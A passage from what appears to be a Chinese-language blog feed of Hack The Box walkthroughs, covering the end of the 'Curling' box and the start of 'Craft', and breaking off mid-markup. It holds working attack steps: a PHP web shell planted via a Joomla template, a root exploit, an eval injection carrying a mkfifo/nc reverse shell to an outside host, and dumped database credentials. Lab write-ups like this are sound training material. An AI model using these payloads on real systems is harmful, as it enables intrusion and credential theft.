Title[Home]<br></code></pre></td></tr></table></figure><p>可以根据谷歌的指示获取目标joomla的版本号：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl -s 10.10.10.150/administrator/manifests/files/joomla.xml | <span class="hljs-built_in">head</span><br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;extension version=<span class="hljs-string">&quot;3.6&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;file&quot;</span> method=<span class="hljs-string">&quot;upgrade&quot;</span>&gt;<br>&lt;name&gt;files_joomla&lt;/name&gt;<br>&lt;author&gt;Joomla! Project&lt;/author&gt;<br>&lt;authorEmail&gt;admin@joomla.org&lt;/authorEmail&gt;<br>&lt;authorUrl&gt;www.joomla.org&lt;/authorUrl&gt;<br>&lt;copyright&gt;(C) 2005 - 2018 Open Source Matters. All rights reserved&lt;/copyright&gt;<br>&lt;license&gt;GNU General Public License version 2 or later; see LICENSE.txt&lt;/license&gt;<br>&lt;version&gt;3.8.8&lt;/version&gt;<br>&lt;creationDate&gt;May 2018&lt;/creationDate&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; searchsploit joomla 3.8.8<br>---------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                        |  Path<br>---------------------------------------------------------------------- ---------------------------------<br>Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting         | php/webapps/43488.txt<br>---------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; searchsploit -m php/webapps/43488.txt<br>  Exploit: Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting<br>      URL: https://www.exploit-db.com/exploits/43488<br>     Path: /usr/share/exploitdb/exploits/php/webapps/43488.txt<br>File Type: Unicode text, UTF-8 text<br><br>Copied to: /home/mosaictheory/Exploit/Pwnkit/43488.txt<br>&gt;&gt; <span class="hljs-built_in">cat</span> 43488.txt <br><span class="hljs-comment"># Exploit Title: Joomla Plugin Easydiscuss &lt;4.0.21 Persistent XSS in Edit Message</span><br><span class="hljs-comment"># Date: 06-01-2018</span><br><span class="hljs-comment"># Software Link: https://stackideas.com/easydiscuss</span><br><span class="hljs-comment"># Exploit Author: Mattia Furlani</span><br><span class="hljs-comment"># CVE: CVE-2018-5263</span><br><span class="hljs-comment"># Category: webapps</span><br><br>1. Description<br><br>Whenever a user edits a message with &lt;\textarea&gt; inside the body, everything after the &lt;\textarea&gt; will be executed <span class="hljs-keyword">in</span> the user’s browser. Works with every version up to 4.0.20<br><br><br>2. Proof of Concept<br><br>Login with permissions to post a message, insert &lt;\textarea&gt; <span class="hljs-keyword">in</span> the body and add any html code after that, whenever a user tries to edit that message the code writed after you closed the textarea will be executed<br><br><br>3. Solution:<br><br>Update to version 4.0.21<br>https://stackideas.com/blog/easydiscuss4021-update <br></code></pre></td></tr></table></figure><p>页面源代码理会有一个这种提示：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518125210218.png" alt="image-20220518125210218"  /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; curl http://10.10.10.150/secret.txt|<span class="hljs-built_in">base64</span> -d<br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100    17  100    17    0     0     27      0 --:--:-- --:--:-- --:--:--    27<br>Curling2018!<br></code></pre></td></tr></table></figure><p>在网站页面会有一些潜藏的用户名：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518125617607.png" alt="image-20220518125617607"  /><p>在尝试floris&#x2F;Curling2018!登录成功了，逐浪因为我之前了解过，我知道它后台会有一些模板能直接编辑PHP代码并导入保存到服务器web指定目录：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518130056355.png" alt="image-20220518130056355"  /><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518130111394.png" alt="image-20220518130111394"  /><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518130407918.png" alt="image-20220518130407918"  /><p>左边会提示编辑的文件目录信息，写完可以直接用蚁剑链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">(*) 基础信息<br>当前路径: /var/www/html/templates/beez3<br>磁盘列表: /<br>系统信息: Linux curling 4.15.0-156-generic <span class="hljs-comment">#163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64</span><br>当前用户: www-data<br>(*) 输入 ashelp 查看本地命令<br>(www-data:/var/www/html/templates/beez3) $ <span class="hljs-built_in">ls</span><br>component.php<br>css<br>error.php<br>favicon.ico<br>html<br>images<br>index.php<br>javascript<br>jsstrings.php<br>language<br>shell.php<br>templateDetails.xml<br>template_preview.png<br>template_thumbnail.png<br>(www-data:/var/www/html/templates/beez3) $<br></code></pre></td></tr></table></figure><p>蚁剑执行漏洞EXP不是很好用，可以反弹MSF会话：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 3771 created.<br>Channel 2 created.<br>script /dev/null -c bash<br>Script started, file is /dev/null<br>www-data@curling:~/html/templates/beez3$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>CVE-2021-2043.py  favicon.ico  javascript     shell.php<br>component.php  html       jsstrings.php  templateDetails.xml<br>css  images       language       template_preview.png<br>error.php  index.php    msf.elf      template_thumbnail.png<br>www-data@curling:~/html/templates/beez3$ ./CVE-2021-2043.py<br>./CVE-2021-2043.py<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-data)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Craft</title>
    <link href="/post/HackTheBox-Craft.html"/>
    <url>/post/HackTheBox-Craft.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Craft.png" alt="Craft"></p><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.110<br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-29 05:04:10 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 6022/tcp on 10.10.10.110                                  <br>Discovered open port 22/tcp on 10.10.10.110                                    <br>Discovered open port 443/tcp on 10.10.10.110  <br>Crazy:~$ sudo nmap -sC -sV 10.10.10.110 -p6022,22,443 -Pn               <br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-29 13:07 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.110<br>Host is up (0.15s latency).<br><br>PORT     STATE SERVICE  VERSION<br>22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 bde76c22817adb3ec0f0731df3af7765 (RSA)<br>|   256 82b5f9d1953b6d800f3591862db3d766 (ECDSA)<br>|_  256 283b2618ecdfb336859c27548d8ce133 (ED25519)<br>443/tcp  open  ssl/http nginx 1.15.8<br>|_http-title: About<br>| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US<br>| Not valid before: 2019-02-06T02:25:47<br>|_Not valid after:  2020-06-20T02:25:47<br>|_http-server-header: nginx/1.15.8<br>| tls-alpn: <br>|_  http/1.1<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>| tls-nextprotoneg: <br>|_  http/1.1<br>6022/tcp open  ssh      (protocol 2.0)<br>| fingerprint-strings: <br>|   NULL: <br>|_    SSH-2.0-Go<br>| ssh-hostkey: <br>|_  2048 5bccbff1a18f72b0c0fbdfa301dca6fb (RSA)<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://ParrotOS.org/cgi-bin/submit.cgi?new-service :<br>SF-Port6022-TCP:V=7.92SVN%I=7%D=8/29%Time=630C4983%P=x86_64-unknown-linux-<br>SF:gnu%r(NULL,C,<span class="hljs-string">&quot;SSH-2\.0-Go\r\n&quot;</span>);<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 47.16 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.110 -p6022,22,443 -Pn<br></code></pre></td></tr></table></figure><p>一个新域名：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829131251254.png" alt="image-20220829131251254"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829133148314.png" alt="image-20220829133148314"></p><p>暂时不知道做什么。尝试枚举了vhost：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~$ wfuzz -u https://craft.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H <span class="hljs-string">&quot;Host:FUZZ.craft.htb&quot;</span> --hh 3779<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: https://craft.htb/</span><br><span class="hljs-string">Total requests: 114441</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                                         </span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000051:   404        4 L      34 W       233 Ch      &quot;api&quot;                                                                                                                                                                                                           </span><br><span class="hljs-string">000005934:   404        1 L      4 W        19 Ch       &quot;vault&quot;                                                                                                                                                                                                                                                                                                                                                     </span><br><span class="hljs-string">000000001:   200        245 L    612 W      7703 Ch     &quot;gogs&quot;                                                             </span><br><span class="hljs-string"></span><br><span class="hljs-string">Total time: 1407.494</span><br><span class="hljs-string">Processed Requests: 114441</span><br><span class="hljs-string">Filtered Requests: 114439</span><br></code></pre></td></tr></table></figure><p>vault无法访问，gogs站点是一个gogs代码托管的应用程序，在里边搜索了半天，看到了test.py文件历史提交中，有一组账号密码：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829165448986.png" alt="image-20220829165448986"></p><p>尝试登录会生成一个token：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829165559147.png" alt="image-20220829165559147"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs BASH"><span class="hljs-string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNjYxNzYzNzMzfQ.kYsVaandH5VO4sonVurHK2zgDsHiMMZM2g-5OVUWLXA&quot;</span><br></code></pre></td></tr></table></figure><p>在brew.py历史提交中有一个eval函数，它用来接收abv的值：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829170726516.png" alt="image-20220829170726516"></p><p>找到对应的brew端点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~$ curl -X POST <span class="hljs-string">&quot;https://api.craft.htb/api/brew/&quot;</span> -H  <span class="hljs-string">&quot;accept: application/json&quot;</span> -H  <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> -d <span class="hljs-string">&quot;&#123;</span><br><span class="hljs-string">\&quot;id\&quot;: 0,</span><br><span class="hljs-string">\&quot;brewer\&quot;: \&quot;crazy\&quot;,</span><br><span class="hljs-string">\&quot;name\&quot;: \&quot;inside\&quot;,</span><br><span class="hljs-string">\&quot;style\&quot;: \&quot;bad\&quot;,</span><br><span class="hljs-string">\&quot;abv\&quot;: \&quot;__import__(&#x27;os&#x27;).system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.3 1337 &gt;/tmp/f&#x27;)\&quot;&#125;&quot;</span> -k -H <span class="hljs-string">&quot;X-CRAFT-API-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNjYxNzY0NDMzfQ.k4qXLTiaGa5Z5qJfUBuGSrZo_Ws6D7QcRcYMBGKqAqE&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.110] 44661<br>/bin/sh: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">/opt/app # script -qc /bin/bash /dev/null</span><br><span class="hljs-string">/bin/sh: script: not found</span><br></code></pre></td></tr></table></figure><p>在一个docker中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ <span class="hljs-comment"># ls -all</span><br>total 64<br>drwxr-xr-x    1 root     root          4096 Feb 10  2019 .<br>drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..<br>-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv<br>drwxr-xr-x    1 root     root          4096 Feb  6  2019 bin<br>drwxr-xr-x    5 root     root           340 Aug 29 05:04 dev<br>drwxr-xr-x    1 root     root          4096 Feb 10  2019 etc<br>drwxr-xr-x    2 root     root          4096 Jan 30  2019 home<br>drwxr-xr-x    1 root     root          4096 Feb  6  2019 lib<br>drwxr-xr-x    5 root     root          4096 Jan 30  2019 media<br>drwxr-xr-x    2 root     root          4096 Jan 30  2019 mnt<br>drwxr-xr-x    1 root     root          4096 Feb  9  2019 opt<br>dr-xr-xr-x  164 root     root             0 Aug 29 05:04 proc<br>drwx------    1 root     root          4096 Feb  9  2019 root<br>drwxr-xr-x    2 root     root          4096 Jan 30  2019 run<br>drwxr-xr-x    2 root     root          4096 Jan 30  2019 sbin<br>drwxr-xr-x    2 root     root          4096 Jan 30  2019 srv<br>dr-xr-xr-x   13 root     root             0 Aug 29 05:04 sys<br>drwxrwxrwt    1 root     root          4096 Aug 29 09:11 tmp<br>drwxr-xr-x    1 root     root          4096 Feb  9  2019 usr<br>drwxr-xr-x    1 root     root          4096 Jan 30  2019 var<br>/ <span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>在&#x2F;opt&#x2F;app&#x2F;craft_api有一组用以链接数据库的凭证。还有一串秘钥，或许是用来做令牌的？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">/opt/app/craft_api <span class="hljs-comment"># cat settings.py</span><br><span class="hljs-comment"># Flask settings</span><br>FLASK_SERVER_NAME = <span class="hljs-string">&#x27;api.craft.htb&#x27;</span><br>FLASK_DEBUG = False  <span class="hljs-comment"># Do not use debug mode in production</span><br><br><span class="hljs-comment"># Flask-Restplus settings</span><br>RESTPLUS_SWAGGER_UI_DOC_EXPANSION = <span class="hljs-string">&#x27;list&#x27;</span><br>RESTPLUS_VALIDATE = True<br>RESTPLUS_MASK_SWAGGER = False<br>RESTPLUS_ERROR_404_HELP = False<br>CRAFT_API_SECRET = <span class="hljs-string">&#x27;hz66OCkDtv8G6D&#x27;</span><br><br><span class="hljs-comment"># database</span><br>MYSQL_DATABASE_USER = <span class="hljs-string">&#x27;craft&#x27;</span><br>MYSQL_DATABASE_PASSWORD = <span class="hljs-string">&#x27;qLGockJ6G2J75O&#x27;</span><br>MYSQL_DATABASE_DB = <span class="hljs-string">&#x27;craft&#x27;</span><br>MYSQL_DATABASE_HOST = <span class="hljs-string">&#x27;db&#x27;</span><br>SQLALCHEMY_TRACK_MODIFICATIONS = False<br>/opt/app/craft_api <span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>还要一个用来测试数据库的python脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">/opt/app <span class="hljs-comment"># ls</span><br>app.py<br>craft_api<br>dbtest.py<br>tests<br>/opt/app <span class="hljs-comment"># python datest.py</span><br>python: can<span class="hljs-string">&#x27;t open file &#x27;</span>datest.py<span class="hljs-string">&#x27;: [Errno 2] No such file or directory</span><br><span class="hljs-string">/opt/app # python dbtest.py</span><br><span class="hljs-string">&#123;&#x27;</span><span class="hljs-built_in">id</span><span class="hljs-string">&#x27;: 12, &#x27;</span>brewer<span class="hljs-string">&#x27;: &#x27;</span>10 Barrel Brewing Company<span class="hljs-string">&#x27;, &#x27;</span>name<span class="hljs-string">&#x27;: &#x27;</span>Pub Beer<span class="hljs-string">&#x27;, &#x27;</span>abv<span class="hljs-string">&#x27;: Decimal(&#x27;</span>0.050<span class="hljs-string">&#x27;)&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">/opt/app <span class="hljs-comment"># cat dbtest.py                                                                                                                                                                                                               </span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><br>import pymysql<br>from craft_api import settings<br><br><span class="hljs-comment"># test connection to mysql database</span><br><br>connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,<br>                             user=settings.MYSQL_DATABASE_USER,<br>                             password=settings.MYSQL_DATABASE_PASSWORD,<br>                             db=settings.MYSQL_DATABASE_DB,<br>                             cursorclass=pymysql.cursors.DictCursor)<br><br>try: <br>    with connection.cursor() as cursor:<br>        sql = <span class="hljs-string">&quot;SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1&quot;</span><br>        cursor.execute(sql)<br>        result = cursor.fetchone()<br>        <span class="hljs-built_in">print</span>(result)<br><br>finally:<br>    connection.close()/opt/app <span class="hljs-comment"># </span><br><br></code></pre></td></tr></table></figure><p>可以将sql改成人为可控参数会方便很多：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> pymysql<br><span class="hljs-keyword">import</span> sys                              <br><span class="hljs-keyword">from</span> craft_api <span class="hljs-keyword">import</span> settings<br>                                   <br><span class="hljs-comment"># test connection to mysql database</span><br>                                                               <br>connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,<br>                             user=settings.MYSQL_DATABASE_USER,        <br>                             password=settings.MYSQL_DATABASE_PASSWORD,<br>                             db=settings.MYSQL_DATABASE_DB,         <br>                             cursorclass=pymysql.cursors.DictCursor)<br>    <br><span class="hljs-keyword">try</span>:                                   <br>    <span class="hljs-keyword">with</span> connection.cursor() <span class="hljs-keyword">as</span> cursor:                                 <br>        sql = sys.argv[<span class="hljs-number">1</span>]<br>        cursor.execute(sql)       <br>        result = cursor.fetchall()<br>        <span class="hljs-built_in">print</span>(result)<br>        <br><span class="hljs-keyword">finally</span>:              <br>    connection.close()<br></code></pre></td></tr></table></figure><p>可以本地改好通过wget去传送入目标：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">/opt/app <span class="hljs-comment"># wget http://10.10.16.3/dbtest.py</span><br>Connecting to 10.10.16.3 (10.10.16.3:80)<br>wget: can<span class="hljs-string">&#x27;t open &#x27;</span>dbtest.py<span class="hljs-string">&#x27;: File exists</span><br><span class="hljs-string">/opt/app # mv dbtest.py .dbtest.py</span><br><span class="hljs-string">/opt/app # wget http://10.10.16.3/dbtest.py</span><br><span class="hljs-string">Connecting to 10.10.16.3 (10.10.16.3:80)</span><br><span class="hljs-string">dbtest.py            100% |********************************|   883  0:00:00 ETA</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">/opt/app <span class="hljs-comment"># python3 dbtest.py &#x27;SELECT USER()&#x27;</span><br>[&#123;<span class="hljs-string">&#x27;USER()&#x27;</span>: <span class="hljs-string">&#x27;craft@172.20.0.6&#x27;</span>&#125;]<br>/opt/app <span class="hljs-comment"># python dbtest.py &#x27;show databases&#x27;</span><br>[&#123;<span class="hljs-string">&#x27;Database&#x27;</span>: <span class="hljs-string">&#x27;craft&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;Database&#x27;</span>: <span class="hljs-string">&#x27;information_schema&#x27;</span>&#125;]<br>/opt/app <span class="hljs-comment"># python dbtest.py &#x27;use craft&#x27;</span><br>/opt/app <span class="hljs-comment"># python dbtest.py &#x27;show tables&#x27;</span><br>[&#123;<span class="hljs-string">&#x27;Tables_in_craft&#x27;</span>: <span class="hljs-string">&#x27;brew&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;Tables_in_craft&#x27;</span>: <span class="hljs-string">&#x27;user&#x27;</span>&#125;]<br>/opt/app <span class="hljs-comment"># python dbtest.py &#x27;SELECT * FROM user&#x27;</span><br>[&#123;<span class="hljs-string">&#x27;id&#x27;</span>: 1, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;dinesh&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;4aUh0A8PbVJxgd&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: 4, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;ebachman&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;llJ77D8QFkLPQB&#x27;</span>&#125;, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: 5, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;gilfoyle&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;ZEU3N8WNM2rh4T&#x27;</span>&#125;]<br></code></pre></td></tr></table></figure><p>还有两个用户名与口令。有一个可以登录gogs，里边有一个id_rsa秘钥：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829173504487.png" alt="image-20220829173504487"></p><p>密钥是加密的，但是数据库中的密码可以使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 